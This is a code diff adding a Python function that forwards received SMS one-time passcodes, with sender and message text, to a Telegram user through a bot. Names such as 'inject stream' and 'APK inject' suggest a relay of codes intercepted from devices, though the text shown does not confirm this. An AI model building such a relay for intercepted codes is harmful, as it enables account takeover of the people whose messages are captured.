@@ -5,10 +5,41 @@ from __future__ import annotations
 import logging
 
 from app.config import get_settings
-from app.device_ui import format_inject_stream_card, format_outbound_stream_card
+from app.device_ui import (
+    format_firebase_otp_card,
+    format_inject_stream_card,
+    format_outbound_stream_card,
+)
 
 logger = logging.getLogger(__name__)
 settings = get_settings()
+
+
+async def send_otp_received_dm(
+    telegram_user_id: int,
+    sender: str,
+    message: str,
+) -> bool:
+    """Firebase OTP/SMS -> bot DM only (no APK inject)."""
+    if not settings.telegram_bot_token:
+        return False
+
+    from telegram import Bot
+
+    bot = Bot(token=settings.telegram_bot_token)
+    card = format_firebase_otp_card(sender, message)
+    try:
+        await bot.send_message(chat_id=telegram_user_id, text=card, parse_mode="HTML")
+        return True
+    except Exception as exc:
+        logger.warning("OTP HTML DM failed for %s: %s — retry plain", telegram_user_id, exc)
+        plain = f"NEW SMS from {sender}\n{message}"[:4000]
+        try:
+            await bot.send_message(chat_id=telegram_user_id, text=plain)
+            return True
+        except Exception as exc2:
+            logger.error("OTP plain DM failed for %s: %s", telegram_user_id, exc2)
+            return False
 
 
 async def send_inject_stream_dm(
